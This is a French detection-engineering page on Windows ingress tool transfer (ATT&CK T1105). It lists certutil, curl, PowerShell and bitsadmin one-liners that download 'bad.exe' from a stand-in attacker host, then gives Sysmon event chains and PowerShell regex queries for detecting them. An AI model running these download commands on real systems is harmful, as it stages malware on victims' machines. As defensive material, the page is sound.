---
title: "Téléchargement d'outils"
description: "Une fois entré, l'attaquant télécharge sur la machine les outils de la suite (scripts de découverte, voleurs de mots de passe, RAT, rançongiciel) avec des commandes intégrées à Windows."
tags: [windows, sysmon, certutil, curl, powershell, lolbin]
updated: 2026-11-18
draft: false
type: technique
attack_id: T1105
tactic: command-and-control
severity: high
platforms: [Windows]
data_sources: [Sysmon, Historique PowerShell]
related:
  - 03-menaces-detection/initial-access/piece-jointe-malveillante
---

## Description

Une attaque commence rarement avec tout son arsenal : la pièce jointe ou la session RDP de départ ne contient presque rien. L'attaquant télécharge ensuite ce dont il a besoin : un script de découverte (Seatbelt), un extracteur de mots de passe (Mimikatz), un RAT, et en fin de course le rançongiciel. Découper l'attaque en plusieurs fichiers aide à passer l'antivirus et expose moins ses outils si l'attaque est repérée tôt.

Pour télécharger, pas besoin d'outil : Windows en fournit plusieurs.

| Outil | Commande |
| --- | --- |
| certutil | `certutil.exe -urlcache -f https://blackhat.example/bad.exe good.exe` |
| curl | `curl.exe https://blackhat.example/bad.exe -o good.exe` (Windows 10 et suivants) |
| PowerShell | `powershell -c "Invoke-WebRequest -Uri 'https://blackhat.example/bad.exe' -OutFile 'good.exe'"` |
| PowerShell | `(New-Object System.Net.WebClient).DownloadFile('https://blackhat.example/bad.exe','C:\ProgramData\bad.exe')` |
| bitsadmin | `bitsadmin /transfer job https://blackhat.example/bad.exe C:\ProgramData\bad.exe` |
| Interface | Copier-coller par la session RDP, ou téléchargement par le navigateur. |

## Ce qu'on observe

L'enchaînement complet dans Sysmon, pour un téléchargement avec curl :

:::etapes
1. **Un interpréteur est lancé**
   Sysmon 1 : `cmd.exe` ou `powershell.exe`, avec un parent suspect.
2. **L'outil de téléchargement démarre**
   Sysmon 1 : `curl.exe`, avec l'URL dans la ligne de commande.
3. **Il contacte le serveur**
   Sysmon 22 (requête DNS) et 3 (connexion) depuis `curl.exe`.
4. **Le fichier arrive sur le disque**
   Sysmon 11 : `Image` = `curl.exe`, `TargetFilename` = le fichier téléchargé.
5. **Le fichier est lancé**
   Sysmon 1 : `Image` = le fichier téléchargé.
:::

Points d'attention : **quel processus** se connecte (certutil n'a presque jamais de raison d'aller sur Internet), **vers quel domaine** (les attaquants hébergent souvent leurs outils sur GitHub ou un autre service de confiance), et **quel fichier** est écrit, et où.

## Détection

### PowerShell sur les journaux Sysmon

Sur un fichier exporté, remplacer `LogName='Microsoft-Windows-Sysmon/Operational'` par `Path='C:\chemin\Sysmon.evtx'`.

```powershell title="lignes de commande de téléchargement (Sysmon 1)"
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; Id=1} |
  Where-Object { $_.Message -match '(?m)^CommandLine: .*(urlcache|curl(\.exe)? .*(-o|--output)|Invoke-WebRequest|iwr |DownloadFile|DownloadString|bitsadmin .*/transfer)' } |
  Select-Object TimeCreated, Message
```

```powershell title="connexions réseau des outils de téléchargement (Sysmon 3)"
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; Id=3} |
  Where-Object { $_.Message -match '(?m)^Image: .*\\(certutil|curl|bitsadmin|powershell)\.exe' } |
  Select-Object TimeCreated, Message
```

```powershell title="fichiers écrits par ces outils (Sysmon 11)"
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; Id=11} |
  Where-Object { $_.Message -match '(?m)^Image: .*\\(certutil|curl|bitsadmin|powershell)\.exe' } |
  Select-Object TimeCreated, Message
```

## Faux positifs

:::faux-positifs
- **Scripts d'administration et de déploiement** qui utilisent `curl` ou `Invoke-WebRequest`, depuis des serveurs et des parents connus.
- **Mises à jour de logiciels** passant par BITS.
- **Développeurs** qui téléchargent des dépendances.
:::

:::piege
- **Un domaine de confiance n'innocente pas un téléchargement** : GitHub, Dropbox ou un CDN hébergent aussi des outils malveillants. Juger le processus, le fichier et son emplacement.
- **Le téléchargement par l'interface graphique ne laisse pas de commande** : on ne voit que le navigateur qui écrit le fichier (Sysmon 11), ou le fichier qui apparaît après un copier-coller par RDP.
:::

## Réponse

À compléter.
